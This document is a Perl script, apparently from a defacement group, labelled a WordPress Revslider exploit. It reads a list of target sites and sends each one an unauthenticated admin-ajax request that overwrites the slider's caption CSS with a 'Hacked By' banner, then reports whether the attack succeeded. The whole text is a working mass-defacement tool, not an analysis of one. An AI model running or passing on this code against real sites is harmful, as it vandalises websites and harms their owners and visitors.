#!/usr/bin/perl 

use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);
 
print " AlabörüTim / Wordpress Revslider Exploit \n";
print " Web Site List:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-]Dosya bulunamadı";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
 
foreach $site(@TARGETS){
 
chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
 
$ajx = $site . 'wp-admin/admin-ajax.php';
 
$link = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';
 
print "Deneniyor...  $site\n";
 
$gassface = POST $ajx, [
'action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' => "<body bgcolor='black'><center><font color='white'><h1>Hacked By Alabörü Tim"];
$response = $ua->request($gassface);
$stat = $response->content;
        if ($stat =~ /true/){
print colored ("[+]Exploit Basarili!!",'white on_red'),"\n";
zonpost();
}else{
print colored ("[-]Exploit Basarisiz!!",'white on_blue'),"\n";
}
}